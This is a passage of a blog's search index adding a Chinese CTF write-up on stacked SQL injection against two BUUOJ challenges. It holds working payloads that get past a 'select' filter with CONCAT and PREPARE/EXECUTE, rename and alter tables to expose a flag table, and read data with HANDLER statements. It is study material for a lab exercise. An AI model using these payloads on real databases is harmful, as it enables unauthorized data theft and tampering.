@@ -830,4 +830,48 @@
 </ul>
 ]]></content>
   </entry>
+  <entry>
+    <title>web-12 sql堆叠注入绕过的骚姿势</title>
+    <url>/2021/01/08/web-12/</url>
+    <content><![CDATA[<h2 id="buuoj-强网杯-2019-随便注-amp-GYCTF2020-Blacklist"><a href="#buuoj-强网杯-2019-随便注-amp-GYCTF2020-Blacklist" class="headerlink" title="buuoj [强网杯 2019]随便注 &amp; [GYCTF2020]Blacklist"></a>buuoj [强网杯 2019]随便注 &amp; [GYCTF2020]Blacklist</h2><p>拿这两个题开刀总结一下堆叠注入的各种骚姿势。</p>
+<h4 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h4><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，例如</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users;show databases; </span><br></pre></td></tr></table></figure>
+
+<p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够<br>虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。（<a href="https://blog.csdn.net/qq_45691294/article/details/107376284">原文</a>）</p>
+<a id="more"></a>
+
+<ul>
+<li><h3 id="set预编译"><a href="#set预编译" class="headerlink" title="set预编译"></a>set预编译</h3><ul>
+<li><h5 id="预编译："><a href="#预编译：" class="headerlink" title="预编译："></a>预编译：</h5><p>详细介绍见<a href="https://www.cnblogs.com/micrari/p/7112781.html">sql预编译</a>。</p>
+<p>说人话就是提前把执行的语句编译好，然后你无论输入什么东西都会给你直接当成要查询的值处理（sql注入是在编译时实现的，没有编译的sql注入也就没什么卵用了），这是预编译防止sql注入的原理。</p>
+</li>
+<li><h5 id="本题的骚姿势："><a href="#本题的骚姿势：" class="headerlink" title="本题的骚姿势："></a>本题的骚姿势：</h5><p>因为过滤了select关键字，因此可以通过sql来拼接出select，因为预编译语句是可以执行concat的，于是可以构造下面的playload。(还有大小写绕过)</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">Set @sql=CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect * <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">Prepare stmt from @sql;</span></span><br><span class="line"><span class="string">execute stmt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><h3 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h3><ul>
+<li><h5 id="思考过程："><a href="#思考过程：" class="headerlink" title="思考过程："></a>思考过程：</h5><p>输入1的时候会显示内容，说明在后端执行了对应的sql语句进行查询，那其实就可以通过修改表名和属性值，在不改变原始的sql语句的条件下，让它可以查询我们想要的内容。</p>
+</li>
+<li><h5 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h5><p>sql中可以用alter语句来修改表的属性，于是可以构造以下的playload。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">rename table `words` to `test`;</span></span><br><span class="line"><span class="string">rename table `1919810931114514` to `words`;</span></span><br><span class="line"><span class="string">alter table `words` change `flag` `id` varchar(100);</span></span><br><span class="line"><span class="string">show columns from words;--+</span></span><br><span class="line"><span class="string"># ALTER TABLE tiger (表名) CHANGE tigername(要修改的列) name (修改后的列名) VARCHAR(20)(类型);</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><h3 id="handler语句查询"><a href="#handler语句查询" class="headerlink" title="handler语句查询"></a>handler语句查询</h3><ul>
+<li><h5 id="handler的说明"><a href="#handler的说明" class="headerlink" title="handler的说明"></a>handler的说明</h5><p>handler有部分select的功能，但是它是mysql独有的，因此不包含在SQL标准里。</p>
+<p>详情如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"><span class="comment"># 打开一张表，无返回结果，实际上声明了一个名为tb1_name的句柄。</span></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"><span class="comment"># 获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</span></span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"><span class="comment"># 关闭打开的句柄。</span></span><br></pre></td></tr></table></figure>
+
+<p>playload:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">handler `1919810931114514` open;</span></span><br><span class="line"><span class="string">handler `1919810931114514` read first;</span></span><br><span class="line"><span class="string">handler `1919810931114514` close;-- +</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+]]></content>
+  </entry>
 </search>
